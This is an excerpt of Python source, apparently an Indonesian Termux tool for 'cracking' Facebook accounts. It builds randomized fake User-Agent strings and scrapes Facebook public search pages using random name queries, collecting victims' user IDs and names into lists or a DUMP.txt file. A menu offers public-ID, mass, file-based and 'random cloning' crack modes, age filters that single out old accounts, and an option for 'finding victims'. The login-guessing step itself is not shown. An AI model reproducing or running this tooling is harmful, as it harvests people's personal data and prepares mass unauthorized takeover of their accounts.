	b=random.choice(['6','7','8','9','10','11','12'])
	c='Linux x86_64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='en-us; ASUS_T00F Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.30 (KHTML, like Gecko) '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.1.483'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (X11'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux x86_64)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android 7.0;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Infinix X559C Build/NRD90M)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['U; Android 8.1.0; en-us; Redmi 5 Plus Build/OPM1.171019.019)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.1.8 swan-mibrowser'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1931 Build/QKQ1.200209.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ru-ru; Redmi 4A Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-N920)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Samsung Galaxy Note 9 Build/SM-N960N)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1. 15 (KHTML, like Gecko) Version/5.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/604.1.'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11AG Build/L120G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)86.0.4529.132 Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['MITO A75)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	f= random.randrange(15, 40)
	g=random.randrange(11, 21)
	XILL=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-C7{f}F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{g}.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	uaa.append(XILL)
	print(f'\r{len(uaa)} User-Agent Terkumpul',end='')
	sys.stdout.flush()
##################################Logo Boleh Di Ubah Asal Jangan Author Nya#####################
def author():
	cetak(pnl("""[green]   Author   : Tamsis
   Umur     : 15 Taun om
   Hobi     : Rebahan
   Facebok  : TamsisSlebew
   Github   : Tamsis-NOP""",width=90,padding=(0,1),title="| [green]INFO AUTHOR [cyan]|",style=f"bold cyan"))
def logo():
	cetak(pnl("[green]       _____                   _         __  ______\n      |_   _|_ _ _ __ ___  ___(_)___     \ \/ /  _ \ \n        | |/ _` | '_ ` _ \/ __| / __|_____\  /| | | |\n[red]        | | (_| | | | | | \__ \ \__ \_____/  \| |_| |\n        |_|\__,_|_| |_| |_|___/_|___/    /_/\_\____/ ",width=90,padding=(0,1),style=f"bold cyan"))
	author()
def kontol(link):
	nama(link)
def nama(opsi):
	p =sup(requests.get(str(opsi)).text,'html.parser')
	for x in p.find_all('td'):
			data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
			for idi in data:
				try:
					user = re.findall('id=(.*)',str(idi))[0]
					nama = user.split("', '")[1]
					jadi = nama.replace("')", "")
					idu = user.split("', '")[0]
					udah=idu+'|'+jadi
					if udah == id:pass
					else:					
							id.append(str(udah))
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
				except IndexError:pass
	if len(id) >= limitd:ngatur()
	else:pass
	try:
		link = p.find('a',string='Lihat Hasil Selanjutnya').get('href')
		kontol(link)
	except:pass
def dumnama1():
	global limitd
	cetak(pnl('   Contoh : 1000,10000,20000',width=90,padding=(0,1),style=f"bold cyan"))
	limi=input('Limit : ')
	limitd+=int(limi)
	for i in range(100000):			
			v= random.choice(string.ascii_letters)
			c= random.choice(string.ascii_letters)
			s= random.choice(string.ascii_letters)
			e= random.choice(string.ascii_letters)
			x= random.choice(string.ascii_letters)
			haha=['adit','risma','risman','asep','udin','cecep','pepen','agus',"iqbal","kami","siska","batam","medan","new","jian","tias","rio"," lia","farz","marvel","jakarta","anisha","juven","der","rika","udin","rayan","tina","tiara","fahmi","baili","rima","gadis","dimas","abram","ajis","vicky","charlie","piko","billa"]
			k=random.choice(['adit','risma','risman','asep','udin','cecep','pepen','agus',"iqbal","kami","siska","batam","medan","new","jian","tias","rio"," lia","farz","marvel","jakarta","anisha","juven","der","rika","udin","rayan","tina","tiara","fahmi","baili","rima","gadis","dimas","abram","ajis","vicky","charlie","piko","billa"])
			t=k+'%20'+v+c+s+e+x+'%20bandung'
			h=v+c+s+e+x+'$20'+k+'%20jawa'
			y=k+'%20sunda'
			to=k+'%20banten'
			ee=random.choice(haha)+'%20'+k
			tai='tante%20'+k
			tot=random.choice([tai,to,y,t,h,ee])
			nama('https://m.facebook.com/public/'+tot+'?/locale2=id_ID')
def dumnama2():
	global limitd
	cetak(pnl('   Contoh : 1000,10000,20000,30000,40000',width=90,padding=(0,1),style=f"bold cyan"))
	limi=input('Limit : ')
	limitd += str(limi)
	for i in range(100000):
			if len(id) >= limitd:ngatur()
			else:pass
			v= random.choice(string.ascii_letters)
			c= random.choice(string.ascii_letters)
			s= random.choice(string.ascii_letters)
			e= random.choice(string.ascii_letters)
			x= random.choice(string.ascii_letters)
			tot=v+c+s+e+x
			nama('https://m.facebook.com/public/'+tot+'?/locale2=id_ID')
def fins(link):
	namafile(link)
def namafile(opsi):
	p =sup(requests.get(str(opsi)).text,'html.parser')
	for x in p.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for idi in data:
			try:
				user = re.findall('id=(.*)',str(idi))[0]
				nama = user.split("', '")[1]
				jadi = nama.replace("')", "")
				idu = user.split("', '")[0]
				udah=idu+'|'+jadi
				cek=open('DUMP.txt','r').read()
				if udah == cek:pass
				else:
					open("DUMP.txt","a").write(f'\n{udah}')
					print(f'\rDump Sedang Berjalan....',end='')
					sys.stdout.flush()
			except IndexError:pass
	try:
		link = p.find('a',string='Lihat Hasil Selanjutnya').get('href')
		namafile(link)
	except:pass
def dumfile1():
	cetak(pnl(' [green]  Hasil Dump Tersimpan Di File DUMP.txt',width=90,padding=(0,1),style=f"bold cyan"))
#	with ThreadPool(max_workers=3) as otw:
	for i in range(100000):
			v= random.choice(string.ascii_letters)
			c= random.choice(string.ascii_letters)
			s= random.choice(string.ascii_letters)
			e= random.choice(string.ascii_letters)
			x= random.choice(string.ascii_letters)
			haha=['adit','risma','risman','asep','udin','cecep','pepen','agus',"iqbal","kami","siska","batam","medan","new","jian","tias","rio"," lia","farz","marvel","jakarta","anisha","juven","der","rika","udin","rayan","tina","tiara","fahmi","baili","rima","gadis","dimas","abram","ajis","vicky","charlie","piko","billa"]
			k=random.choice(['adit','risma','risman','asep','udin','cecep','pepen','agus',"iqbal","kami","siska","batam","medan","new","jian","tias","rio"," lia","farz","marvel","jakarta","anisha","juven","der","rika","udin","rayan","tina","tiara","fahmi","baili","rima","gadis","dimas","abram","ajis","vicky","charlie","piko","billa"])
			t=k+'%20'+v+c+s+e+x+'%20bandung'
			h=v+c+s+e+x+'$20'+k+'%20jawa'
			y=k+'%20sunda'
			to=k+'%20banten'
			ee=random.choice(haha)+'%20'+k
			tai='tante%20'+k
			tot=random.choice([tai,to,y,t,h,ee])
			namafile('https://m.facebook.com/public/'+tot+'?/locale2=id_ID')
def dumfile2():
	cetak(pnl(' [green]  Hasil Dump Tersimpan Di File DUMP.txt',width=90,padding=(0,1),style=f"bold cyan"))
	#with ThreadPool(max_workers=3) as otw:
	for i in range(100000):
			v= random.choice(string.ascii_letters)
			c= random.choice(string.ascii_letters)
			s= random.choice(string.ascii_letters)
			e= random.choice(string.ascii_letters)
			x= random.choice(string.ascii_letters)
			tot=v+c+s+e+x
			namafile('https://m.facebook.com/public/'+tot+'?/locale2=id_ID')	

def menu():
	termux('clear')
	logo()
	cetak(pnl("""  [green] [ 1 ] Crack ID Publik
   [ 2 ] Crack ID Publik Massal Otomatis
   [ 3 ] Crack ID Publik Massal Manual
   [ 4 ] Crack File
   [ 5 ] Crack Random Cloning Lokal
   [ 6 ] Crack Random Cloning Bebas
   [ 7 ] Menu Bot""",width=90,padding=(0,1),title=f"| [green]MENU CRACK[cyan] |",style=f"bold cyan"))
	menu = input('pilih : ')
	if menu in['1']:
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=90,padding=(0,1),title="[green]UMUR",style=f"bold cyan"))
		cetak(pnl('[ 6 ] [green]Mencari Tumbal [ 2023 ]',width=90,padding=(0,1),title=f"[green]CARI TUMBAL",style=f"bold cyan"))
		p = input('pilih : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		elif p in ['6']:umur.append('tumbal')
		else:umur.append('tamsis')
		dump('publik')
	elif menu in['6']:dumnama2()
	elif menu in ['7']:bot()
	elif menu in['5']:dumnama1()
	elif menu in['e','E']:exit()
	elif menu in['2']:
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=90,padding=(0,1),title=f"[green]UMUR",style=f"bold cyan"))
		#cetak(pnl('[white][ 6 ] Mencari Tumbal [ 2023 ]',width=90,padding=(0,1),title=f"CARI TUMBAL",style=f"bold green"))
		p = input('Pilih : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		#elif p in ['6']:umur.append('tumbal')
		else:umur.append('tamsis')
		dump('massal')
	elif menu in ['3']:
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=90,padding=(0,1),title=f"[green]UMUR",style=f"bold cyan"))
		cetak(pnl('[white][ 6 ] Mencari Tumbal [ 2023 ]',width=90,padding=(0,1),title=f"[green]CARI TUMBAL[cyan]",style=f"bold green"))
		p = input('pilih : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		elif p in ['6']:umur.append('tumbal')
		else:umur.append('tamsis')
		dump_masal()
	elif menu in['4']:
		nama = input('pilih file : /sdcard/')
		try:p = open('/sdcard/'+nama,'r').read().splitlines()
		except:print('file tidak ditemukan');exit()
		for kontol in p :
			ido=kontol.split('|')[0]
			if len(ido)>12:
				id.append(kontol)
				print(f'\r{len(id)} ID Terkumpul',end='')
